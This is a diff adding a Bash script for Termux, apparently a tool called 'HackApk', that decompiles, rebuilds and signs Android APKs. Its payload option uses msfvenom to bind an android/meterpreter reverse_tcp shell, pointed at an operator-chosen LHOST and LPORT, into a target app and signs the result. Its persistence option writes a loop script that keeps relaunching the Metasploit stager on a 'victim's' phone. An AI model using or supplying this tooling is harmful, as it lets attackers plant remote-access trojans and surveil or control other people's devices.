@@ -1,0 +1,466 @@
+#!/data/data/com.termux/files/usr/bin/bash
+
+## HackApk Version 1.0
+## Author : Aditya Shakya
+## A Apk Hacking Framework
+
+## Init
+clear
+unset LD_PRELOAD
+DIR=`pwd`
+if  [ $DIR != $HOME/hackapk ]
+	then
+	DIR=$HOME/hackapk
+fi
+
+## Strings
+SEL="[Choose file, Enter Number Of File Or 'x' To Exit]: "
+QUT="[Sure? Press ENTER To Exit] "
+RET="[Press ENTER To Return To Main Menu] "
+PRS="[Press ENTER To Continue] "
+CHS="[Choose One Option]: "
+VER="Version 1.0"
+
+## Colors
+C='\033[1;36m'
+G='\033[1;32m'
+R='\033[1;31m'
+Y='\033[1;33m'
+B='\033[1;34m'
+P='\033[1;35m'
+RE='\033[0m'
+
+## Banner
+echo
+echo -e $R"        .o oOOOOOOOo                                            OOOo"
+echo -e $R"        Ob.OOOOOOOo  OOOo.      oOOo.                      .adOOOOOOO"
+echo -e $R"        OboO““““““““““““.OOo. .oOOOOOo.    OOOo.oOOOOOo.““““““““““'OO"
+echo -e $R"        OOP.oOOOOOOOOOOO POOOOOOOOOOOo.   ’”OOOOOOOOOP,OOOOOOOOOOOB'"
+echo -e $R"        ’O'OOOO'     ’OOOOo”OOOOOOOOOOO’ .adOOOOOOOOO”oOOO'    ’OOOOo"
+echo -e $R"        .OOOO'            ’OOOOOOOOOOOOOOOOOOOOOOOOOO'            ’OO"
+echo -e $R"        OOOOO                 '“OOOOOOOOOOOOOOOO“’                oOO"
+echo -e $R"       oOOOOOba.                .adOOOOOOOOOOba               .adOOOOo."
+echo -e $R"      oOOOOOOOOOOOOOba.    .adOOOOOOOOOO@^OOOOOOOba.     .adOOOOOOOOOOOO"
+echo -e $R"     OOOOOOOOOOOOOOOOO.OOOOOOOOOOOOOO“’  '“OOOOOOOOOOOOO.OOOOOOOOOOOOOO"
+echo -e $R"     “OOOO“       “YOoOOOOMOIONODOO“’  .   '“OOROAOPOEOOOoOY“     “OOO"
+echo -e $R"        Y           'OOOOOOOOOOOOOO: .oOOo. :OOOOOOOOOOO?'         :’"
+echo -e $R"        :            .oO%OOOOOOOOOOo.OOOOOO.oOOOOOOOOOOOO?         ."
+echo -e $R"        .            oOOP“%OOOOOOOOoOOOOOOO?oOOOOO?OOOO“OOo        $C Recompile"
+echo -e $R"        $G Sign $R       '%o  OOOO“%OOOO%“%OOOOO“OOOOOO“OOO':"
+echo -e $R"                          ’$“  ’OOOO' ’O“Y ' ’OOOO'  o             ."
+echo -e $R"        .                  .     OP“          : o     .            $P Zipalign"
+echo -e $R"        $Y Decompile $R               :                   $B Payload"
+echo -e $R"                                  ."
+echo -e $R"                                  $G HackApk V1.0"
+echo -e $R"                                  $P ••••••••••••••••••••••"
+echo -e $R"                                  $C Author :$Y Aditya Shakya"
+echo -e $R"                                  $C Email  :$Y adi1090x@gmail.com"
+echo -e $R"                                  $R Apk Hacking Framework for Termux"
+echo
+
+## Main Menu
+echo
+echo -e $B"        [$R"01"$B]$G Install Frameworks$P *needed for recompiling"
+echo -e $B"        [$R"02"$B]$G Decompile Apk"
+echo -e $B"        [$R"03"$B]$G Recompile Apk"
+echo -e $B"        [$R"04"$B]$G Sign Apk $P*needed for installing"
+echo -e $B"        [$R"05"$B]$G Zipalign"
+echo -e $B"        [$R"06"$B]$G Bind Payload In Apk"
+echo -e $B"        [$R"07"$B]$G Persistence Backdoor Script"
+echo -e $B"        [$R"08"$B]$G Reset Directories"
+echo -e $B"        [$R"09"$B]$G About Program"
+echo -e $B"        [$R"10"$B]$G Exit"
+echo
+echo
+echo -ne $B"        [$R"Select Option"$B]:$G "
+read opt
+
+## Option 1
+if [ $opt = "1" ] || [ $opt = "01" ];
+then
+echo
+echo -e $P"‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡"
+echo
+echo -e $R"[*] You Need To Install The 'framework-res.apk'"
+echo -e $R"    From The '/system/frameworks' Directory Of Your Device."
+echo
+echo -ne $Y"[*] You Want Me To Copy This Apk In 'frameworks' Directory (y/n)? "
+read chs
+if [ $chs = 'y' ] || [ $chs = 'Y' ] ; then
+cp /system/framework/framework-res.apk $DIR/frameworks
+echo -e $G"[*] Successfully Copied."
+else
+echo -e $R"[*] Can't Copy The File framework-res.apk, Continued..."
+fi
+echo
+echo -ne $B"$PRS"$C
+read userpress
+cd $DIR/frameworks
+echo
+echo
+ls | cat -n
+echo
+echo -ne $Y"$SEL"
+read choice
+echo -e ""$C
+if [ $choice = 'x' ] || [ $choice = 'X' ] ; then
+echo -ne $R"$QUT"
+read userpress
+echo
+exit
+else
+OUTPUT=`ls | sed -n $choice'p'`
+sh $DIR/.data/apktool if $DIR/frameworks/$OUTPUT -p $DIR
+echo
+echo -ne $B"$RET"$RE
+read userpress
+fi
+cd $DIR
+$DIR/hackapk
+
+## Option 2
+elif [ $opt = "2" ] || [ $opt = "02" ];
+then
+echo
+echo -e $P"‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡"
+echo
+echo -e $R"[*] Place Apk In 'decompiler' Directory."
+echo
+echo -e $Y"[*] Decompiling An Apk File."
+echo
+echo -ne $B"$PRS"$C
+read userpress
+echo
+cd $DIR/decompiler
+ls | cat -n
+echo
+echo -ne $Y"$SEL"
+read choice
+echo -e ""$C
+if [ $choice = 'x' ] ; then
+echo -ne $R"$QUT"
+read userpress
+echo
+exit
+else
+cd $DIR/decompiler
+OUTPUT=`ls | sed -n $choice'p'`
+sh $DIR/.data/apktool d $DIR/decompiler/$OUTPUT -o $DIR/recompiler/$OUTPUT
+echo
+echo -e $G"[*] Decompiled Files Are Stored In 'recompiler' Directory."
+echo -e "    You May Want To Check The Source Code Of App."
+echo
+echo -ne $B"$RET"$RE
+read userpress
+fi
+cd $DIR
+$DIR/hackapk
+
+## Option 3
+elif [ $opt = "3" ] || [ $opt = "03" ];
+then
+echo
+echo -e $P"‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡"
+echo
+echo -e $Y"[*] This Will Compile The Source Code."
+echo
+echo -e $R"[*] Warning: The App Can't Be Install Until You Sign it."
+echo
+echo -ne $B"$PRS"$C
+read userpress
+echo
+cd $DIR/recompiler
+ls | cat -n
+echo
+echo -ne $Y"$SEL"
+read choice
+echo -e ""$C
+if [ $choice = 'x' ]
+then
+echo -ne $R"$QUT"
+read userpress
+echo
+exit
+else
+OUTPUT=`ls | sed -n $choice'p'`
+sh $DIR/.data/apktool b --aapt $DIR/.data/binaries/bin/aapt $DIR/recompiler/$OUTPUT -o $DIR/unsigned/$OUTPUT
+echo
+echo -e $G"[*] Recompiled Apk Are Stored In 'unsigned' Directory."
+echo -e "    You Need To Sign Apk For Installation."
+echo
+echo -ne $B"$RET"$RE
+read userpress
+fi
+cd $DIR
+$DIR/hackapk
+
+## Option 4
+elif [ $opt = "4" ] || [ $opt = "04" ];
+then
+echo
+echo -e $P"‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡"
+echo
+echo -e $Y"[*] Sign The Apk."
+echo
+echo -e $G"[*] App Will Be Ready To Install After You Sign It."
+echo
+echo -ne $B"$PRS"$C
+read userpress
+echo
+cd $DIR/unsigned
+ls | cat -n
+echo
+echo -ne $Y"$SEL"
+read choice
+echo -e ""$C
+if [ $choice = 'x' ] ; then
+echo -ne $R"$QUT"
+read userpress
+echo
+exit
+else
+echo -e $G"[*] Signing Apk ..."
+OUTPUT=`ls | sed -n $choice'p'`
+sh $DIR/.data/signapk publickey.x509.pem publickey.pk8 $DIR/unsigned/$OUTPUT $DIR/signed/signed_$OUTPUT
+echo
+echo -e $G"[*] Signed Apk Is Stored In 'signed' Directory."
+echo
+echo -ne $B"$RET"$RE
+read userpress
+echo
+fi
+cd $DIR
+$DIR/hackapk
+
+## Option 5
+elif [ $opt = "5" ] || [ $opt = "05" ];
+then
+echo
+echo -e $P"‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡"
+echo
+echo -e $R"[*] Place Apk To Be Zipaligned In 'zipalign' Directory."
+echo
+echo -ne $B"$PRS"$C
+read userpress
+echo
+cd $DIR/zipalign
+ls | cat -n
+echo
+echo -ne $Y"$SEL"
+read choice
+echo -e ""$C
+if [ $choice = 'x' ] ; then
+echo -ne $R"$QUT"
+read userpress
+echo
+exit
+else
+OUTPUT=`ls | sed -n $choice'p'`
+sh $DIR/.data/zzipalign -f -v 4 $DIR/zipalign/$OUTPUT $DIR/zipalign/zipaligned_$OUTPUT
+echo
+echo -e $G"[*] Zipaligned Apk Is Stored In 'zipalign' Directory."
+echo
+echo -ne $B"$RET"$RE
+read userpress
+echo
+fi
+cd $DIR
+$DIR/hackapk
+
+## Option 6
+elif [ $opt = "6" ] || [ $opt = "06" ];
+then
+echo
+echo -e $P"‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡"
+echo
+echo -e $R"[*] Make Sure, Metasploit Is Installed."
+echo
+echo -e $G"[*] Please First Copy Your Target Apk File Into 'payload' Directory."
+echo
+echo -ne $B"$PRS"$C
+read userpress
+echo
+if [ ! -d $DIR/payload ]
+	then
+	mkdir $DIR/payload
+fi
+echo
+cd $DIR/payload
+ls | cat -n
+echo
+echo -ne $Y"$SEL"
+read choice
+echo -e ""$C
+if [[ $choice == "" ]]
+then
+	echo -e $R"[!] Please Enter Valid Choice. Please Wait You Are Redirecting To Main Menu."
+	sleep 3
+	$DIR/hackapk
+fi
+if [ $choice = 'x' ] ; then
+echo -ne $R"$QUT"
+read userpress
+echo
+exit
+else
+OUTPUT=`ls | sed -n $choice'p'`
+mv $DIR/payload/$OUTPUT $HOME/metasploit-framework
+echo -e $P"[*] Please Enter Following Details : "
+echo
+echo -ne $R" >> LHOST : $G"
+read lhost
+echo -ne $R" >> LPORT : $G"
+read lport
+echo -ne $Y" >> ENTER THE NAME YOU WANT TO GIVE FOR THE FINAL APP: $G"
+read finalname
+echo
+echo -e $B"[*] Please Wait While Binding ..."$C
+echo
+cd $HOME/metasploit-framework
+./msfvenom -x $OUTPUT -p android/meterpreter/reverse_tcp lhost=$lhost lport=$lport
+
+echo
+echo -e $G"[*] Signing Payloaded Apk ..."
+mv $DIR/unsigned/output.apk $DIR/unsigned/$finalname.apk
+sh $DIR/.data/signapk publickey.x509.pem publickey.pk8 $DIR/unsigned/$finalname.apk $DIR/final/$finalname.apk
+rm $DIR/unsigned/$finalname.apk
+rm $HOME/metasploit-framework/$OUTPUT
+fi
+echo
+echo -e $Y"[*] Successfully Generated Payload In The Apk. "
+echo
+echo -e $Y"[*] Payloaded Apk Stored In$R 'final'$Y Directory."
+echo
+echo -ne $B"$RET"$RE
+read userpress
+cd $DIR
+$DIR/hackapk
+
+## Option 7
+elif [ $opt = "7" ] || [ $opt = "07" ];
+then
+echo
+echo -e $P"‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡"
+echo
+echo -e $Y"[*] Generating Persistent Script..."
+echo
+printf "#!/system/bin/sh\nwhile :\ndo am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity\nsleep 20\ndone\n" > $DIR/script/script.sh
+chmod +x $DIR/script/script.sh
+echo -e $G"[*] Shell Script Generated In 'script' Directory."
+echo
+echo -e $R"[*] Now You Can Run This Script Into Your Victim's Android Phone,"
+echo -e "    Make Your Session Died-Free Payload."
+echo
+echo -ne $B"$RET"$RE
+read userpress
+cd $DIR
+$DIR/hackapk
+
+## Option 8
+elif [ $opt = "8" ] || [ $opt = "08" ];
+then
+echo
+echo -e $P"‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡"
+echo
+echo -e $R"[!] Warning: This Option Will Delete All Files Including Payload, Signed"
+echo -e "    Apks And Other Files & Will Make All Directories Empty."
+echo
+echo -ne $B"$PRS"
+read userpress
+echo
+echo -e $Y"[*] Please Wait ..."
+echo
+echo -e $C"[*] Clearing Files In Directory : decompiler..."
+rm -rf $DIR/decompiler/*
+sleep 1
+echo -e $C"[*] Clearing Files In Directory : recompiler..."
+rm -rf $DIR/recompiler/*
+sleep 1
+echo -e $C"[*] Clearing Files In Directory : signed..."
+rm -rf $DIR/signed/*
+sleep 1
+echo -e $C"[*] Clearing Files In Directory : unsigned..."
+rm -rf $DIR/unsigned/*
+sleep 1
+echo -e $C"[*] Clearing Files In Directory : zipalign..."
+rm -rf $DIR/zipalign/*
+sleep 1
+echo -e $C"[*] Clearing Files In Directory : payload..."
+rm -rf $DIR/payload/*
+sleep 1
+echo -e $C"[*] Clearing Files In Directory : final..."
+rm -rf $DIR/final/*
+sleep 1
+echo -e $C"[*] Clearing Files In Directory : script..."
+rm -rf $DIR/script/*
+sleep 1
+echo
+echo -e $G"[!] Files Deleted!, Successfully Restored All Directories."
+echo
+echo -ne $B"$RET"$RE
+read userpress
+cd $DIR
+$DIR/hackapk
+
+## Option 9
+elif [ $opt = "9" ] || [ $opt = "09" ];
+then
+echo
+echo -e $B"        ┌───────────────────────────────────────────────────────────────┐"
+echo -e $B"        │          $R┏━┓┏┓ ┏━┓╻ ╻╺┳╸       $R╻ ╻┏━┓┏━╸╻┏ ┏━┓┏━┓╻┏           $B│"
+echo -e $B"        │          $R┣━┫┣┻┓┃ ┃┃ ┃ ┃    $Y╹   $R┣━┫┣━┫┃  ┣┻┓┣━┫┣━┛┣┻┓          $B│"
+echo -e $B"        │          $R╹ ╹┗━┛┗━┛┗━┛ ╹    $Y╹   $R╹ ╹╹ ╹┗━╸╹ ╹╹ ╹╹  ╹ ╹          $B│"
+echo -e $B"        │───────────────────────────────────────────────────────────────│"
+echo -e $B"        │                                                               │"
+echo -e $B"        │ $R>>  $G'Hackapk'$C is a powerful tool for a complete apk modding   $B│"
+echo -e $B"        │    $C in termux. it can decompile, recompile, sign, zipalign    $B│"
+echo -e $B"        │    $C an android apk as well as can bind 'payload' in any apk.  $B│"
+echo -e $B"        │                                                               │"
+echo -e $B"        │                                                               │"
+echo -e $B"        │ $R>> $C Author   :$G  Aditya Shakya                                 $B│"
+echo -e $B"        │    $C Email    :$G  adi1090x@gmail.com                            $B│"
+echo -e $B"        │    $C Github   :$G  https://github.com/adi1090x                   $B│"
+echo -e $B"        │    $C Facebook :$G  https://facebook.com/adi1090x                 $B│"
+echo -e $B"        │                                                               │"
+echo -e $B"        │                                                               │"
+echo -e $B"        │ $R>>  $G'Hackapk'$C is an advanced version of former apk-modding    $B│"
+echo -e $B"        │    $C tool,$G 'Tmux-Bunch'$C By$G 'Hax4us'$C. you can get that here,    $B│"
+echo -e $B"        │                                                               │"
+echo -e $B"        │    $G https://github.com/Hax4us/Tmux-Bunch                      $B│"
+echo -e $B"        │                                                               │"
+echo -e $B"        │───────────────────────────────────────────────────────────────│"
+echo -e $B"        │                $Y[$R"!"$Y]$R Please Do Not Copy My Work.                $B│"
+echo -e $B"        └───────────────────────────────────────────────────────────────┘"
+echo
+echo -ne $B"        [*] Press $R'Enter'$B To Return To Main Menu "
+read enter 
+cd $DIR
+$DIR/hackapk
+
+## Option 10
+elif [ $opt = "10" ] || [ $opt = "00" ];
+then
+echo
+echo -e $Y"        [*] Thanks For Using This Program!"
+echo -e $B"        [*] Bye Bye ...!"
+echo -e $G"        [*] Have A Nice Day!"
+echo -e "$RE"
+exit
+
+## Wrong Input Action
+else
+echo
+echo -e $Y"        [!] Wrong Input... "
+echo -ne $G"        [*] Try Again... "
+sleep 2
+clear
+$DIR/hackapk
+echo
+fi
+
+##**********************************************##
+##												##
+##   Developed By : Aditya Shakya // adi1090x   ##
+##   Email: adi1090x@gmail.com					##
+##												##
+##**********************************************##
